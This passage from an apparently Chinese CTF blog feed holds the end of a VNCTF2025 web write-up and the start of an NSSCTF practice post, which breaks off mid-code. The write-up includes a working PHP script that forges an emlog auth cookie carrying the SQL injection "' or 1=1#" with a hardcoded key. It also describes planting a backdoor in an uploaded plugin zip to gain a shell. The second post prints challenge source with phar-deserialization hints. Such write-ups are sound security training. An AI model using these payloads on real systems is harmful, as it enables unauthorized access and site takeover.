class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, AUTH_KEY);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAuthCookie</span>(<span class="params"><span class="variable">$cookie</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$cookie</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$cookie_elements</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$cookie_elements</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$expiration</span>, <span class="variable">$hmac</span>) = <span class="variable">$cookie_elements</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$expiration</span>) &amp;&amp; <span class="variable">$expiration</span> &lt; <span class="title function_ invoke__">time</span>()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$hmac</span> !== <span class="variable">$hash</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$user</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserDataByLogin</span>(<span class="variable">$username</span>);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>generateAuthCookie函数，validateAuthCookie函数，emHash函数。generateAuthCookie是生成认证cookie，我们想要伪造cookie登录的话那就要使用到这个generateAuthCookie函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>传参$user_login和$expiration，我们查找用法看一下是啥。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">setAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$persist</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$persist</span>) &#123;</span><br><span class="line">            <span class="variable">$expiration</span> = <span class="title function_ invoke__">time</span>() + <span class="number">3600</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">12</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$expiration</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$auth_cookie_name</span> = AUTH_COOKIE_NAME;</span><br><span class="line">        <span class="variable">$auth_cookie</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">generateAuthCookie</span>(<span class="variable">$user_login</span>, <span class="variable">$expiration</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="variable">$auth_cookie_name</span>, <span class="variable">$auth_cookie</span>, <span class="variable">$expiration</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>$expiration几乎不用管了，看$user_login就行，继续查找用法。</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216184650642.png" class="" title="图片引用方法一"><p>user_login是用户名。那就很简单了，我们知道用户名的话就能伪造cookie实现登录。</p><p>但是没有给出任何用户名。。。</p><p>找了半天，发现！在validateAuthCookie函数中有个getUserDataByLogin的方法，应该是通过用户名获取用户信息的一个方法。</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216184841658.png" class="" title="图片引用方法一"><p>其中存在sql语句的拼接！一眼sql注入。。</p><p>先来看看validateAuthCookie函数，捋一下</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216185142267.png" class="" title="图片引用方法一"><p>这个函数接收认证cookie，然后将其拆分为原来的形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list($username, $expiration, $hmac) = $cookie_elements;</span><br></pre></td></tr></table></figure><p>因此，sql注入直接万能密码就能进入了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">    <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, <span class="string">&#x27;yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">generateAuthCookie</span>(<span class="string">&quot;&#x27; or 1=1#&quot;</span>,<span class="number">0</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1#|0|71f4f3bbe056e7791debdc858b458a7c</span><br></pre></td></tr></table></figure><p>然后对validateAuthCookie函数查找一下用法，看看怎么将伪造的cookie传入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAuthCookie</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[AUTH_COOKIE_NAME])) &#123;</span><br><span class="line">        <span class="title class_">Output</span>::<span class="title function_ invoke__">authError</span>(<span class="string">&#x27;auth cookie error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$userInfo</span> = loginauth::<span class="title function_ invoke__">validateAuthCookie</span>(<span class="variable">$_COOKIE</span>[AUTH_COOKIE_NAME]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$userInfo</span>) &#123;</span><br><span class="line">        <span class="title class_">Output</span>::<span class="title function_ invoke__">authError</span>(<span class="string">&#x27;auth cookie error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;curUserInfo = <span class="variable">$userInfo</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;curUid = (<span class="keyword">int</span>)<span class="variable">$userInfo</span>[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216190820178.png" class="" title="图片引用方法一"><p>直接进到后台！耶耶耶！！！</p><p>查一下后台漏洞吧。。。本以为会直接给flag</p><p><a href="https://blog.csdn.net/W13680336969/article/details/137267677">https://blog.csdn.net/W13680336969/article/details/137267677</a></p><p><a href="https://github.com/yangliukk/emlog/blob/main/Plugin-getshell.md">https://github.com/yangliukk/emlog/blob/main/Plugin-getshell.md</a></p><p>接下来跟着文章走一下</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216191127008.png" class="" title="图片引用方法一"><p>在网上找一个插件压缩包，构建如下格式，往里面塞一个后门即可。（这里我直接把插件中的postchat.php文件内容改成了后门）</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216194011009.png" class="" title="图片引用方法一"><p>但是我们不知道上传的目录</p><p>看一下plugin.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;upload_zip&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;APP_UPLOAD_FORBID&#x27;</span>) &amp;&amp; APP_UPLOAD_FORBID === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emMsg</span>(<span class="string">&#x27;系统禁止上传安装应用&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">LoginAuth</span>::<span class="title function_ invoke__">checkToken</span>();</span><br><span class="line">    <span class="variable">$zipfile</span> = <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pluzip&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;pluzip&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>] == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_d=1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_g=1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$zipfile</span> || <span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>] &gt;= <span class="number">1</span> || <span class="keyword">empty</span>(<span class="variable">$zipfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emMsg</span>(<span class="string">&#x27;插件上传失败， 错误码：&#x27;</span> . <span class="variable">$zipfile</span>[<span class="string">&#x27;error&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">getFileSuffix</span>(<span class="variable">$zipfile</span>[<span class="string">&#x27;name&#x27;</span>]) != <span class="string">&#x27;zip&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_f=1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="title function_ invoke__">emUnZip</span>(<span class="variable">$zipfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;../content/plugins/&#x27;</span>, <span class="string">&#x27;plugin&#x27;</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$ret</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?activate_install=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_e=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_b=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;./plugin.php?error_c=1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点在此处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ret = emUnZip($zipfile[&#x27;tmp_name&#x27;], &#x27;../content/plugins/&#x27;, &#x27;plugin&#x27;);</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216194234363.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;8ceee0ba-f6e3-f38f-903c-4f96cab7d6b5&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSS-web刷题</title>
      <link href="/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"/>
      <url>/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>NSSCTF web 刷题，督促自己用的，图就不放了，好麻烦嘤嘤嘤</p><h2 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="[SWPU 2018]SimplePHP"></a>[SWPU 2018]SimplePHP</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090655640.png" alt="image-20241129090655640" style="zoom: 80%;" /><p>一眼任意文件读取</p><p>获取目录下的文件</p><p><strong>index.php</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090754383.png" alt="image-20241129090754383"></p><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span 